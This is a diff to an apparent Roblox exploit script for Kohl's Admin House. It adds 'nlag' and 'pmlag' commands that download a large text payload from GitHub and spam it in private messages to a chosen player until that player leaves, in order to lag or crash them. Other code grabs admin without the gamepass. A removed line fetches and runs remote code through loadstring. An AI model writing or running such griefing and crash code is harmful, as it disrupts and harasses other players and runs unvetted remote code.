@@ -54,18 +54,11 @@
 	"freedom" (stops controlling the crowd, stops //crowdcontrol)
 	"protection" (remade, stops other exploiters from being able to lag you by resetting you every wait(1) )
 	"protectionoff" (disables exploiter protection, see command above this for more info)
+	"nlag" (lags a player using pm)
 	
 	Gamepass Commands:
 	"rocketfailure [player]" (sends player on a space mission via a fast moving untested rocket, spoiler: BOOM!)
-	
-	OofKohls v2 Some-Of-Its-Cmds:
-	"antipunish" (obviously, keeps you from being punished)
-	"antiblind" (obviously, keeps you from being blinded)
-	"antikill" (obviously unneeded, keeps you from being killed via reset, script automatically does something better)
-	"antijail" (obviously, stops you from being jailed, removes all jails not just yours when you are jailed)
-	"tlag [player]" (attempts to crash the player via private message)
-	"partspam" (prisoner299's admin gamepass needed, will spam parts sized 10)
-	"xcmds" (for more info on OofKohls v2's Commands)
+	"pmlag [player]" (does //nlag but better prisoners299 admin needed)
 	--]])
 	
 	local players = game:GetService("Players")
@@ -73,7 +66,11 @@
 	local chatted = lplayer.Chatted
 	local gamefolder = game:GetService("Workspace").Terrain["_Game"]
 	local market = game:GetService("MarketplaceService")
+	local lagtext = game:HttpGetAsync("https://raw.githubusercontent.com/exceptional0/kohlsantikill/master/largetext.txt")
+	--from oofkohlsv2 ^
 	
+	
+	--// gamepass autogive admin
 	if not market:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 66254) then
     local path = game:GetService("Workspace").Terrain["_Game"].Admin.Pads
     for i,v in pairs(path:GetChildren()) do
@@ -484,6 +481,34 @@ end
 	while wait(1) and _G.exploiterprotection do
 	chicken:Chat("reset me")
 	end
+	elseif msg:match("//nlag") then
+	local splitstring = string.split(msg, " ")
+	local chicken = game:GetService("Players")
+	local loser = splitstring[2]
+	for i,v in pairs(getplr(loser)) do
+	local loser = v.Name
+	_G.nlag = true
+	repeat
+	wait(0.2)
+	chicken:Chat("pm " ..loser.. " " ..lagtext.. "")
+	chicken:Chat("pm " ..loser.. " " ..lagtext.. "")
+	chicken:Chat("pm " ..loser.. " " ..lagtext.. "")
+	until game.Players:FindFirstChild(loser) == nil or _G.nlag == false
+	end
+	elseif msg:match("//pmlag") then
+	local splitstring = string.split(msg, " ")
+	local chicken = game:GetService("Players")
+	local loser = splitstring[2]
+	for i,v in pairs(getplr(loser)) do
+	local loser = v.Name
+	_G.lag = true
+	repeat
+	wait(0.2)
+	chicken:Chat("pm/" ..loser.. " " ..lagtext.. "")
+	chicken:Chat("pm/" ..loser.. " " ..lagtext.. "")
+	chicken:Chat("pm/" ..loser.. " " ..lagtext.. "")
+	until game.Players:FindFirstChild(loser) == nil or _G.lag == false
+	end
 	end
 	end)
 	
@@ -501,10 +526,15 @@ end
 	_G.crowdcontrol = false
 	elseif msg:match("//protectoff") then
 	_G.exploiterprotection = false
+	elseif msg:match("//lagoff") then
+	if _G.nlag then
+	_G.nlag = false
+	end
+	if _G.lag then
+	_G.lag = false
+	end
 	end
 	end)
 	
-	--oofkohls v2 by stefanuk12
-	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Stefanuk12/ROBLOX/master/Games/Kohls%20Admin%20House/Main.lua"))()
 
 	print("admin ready!")
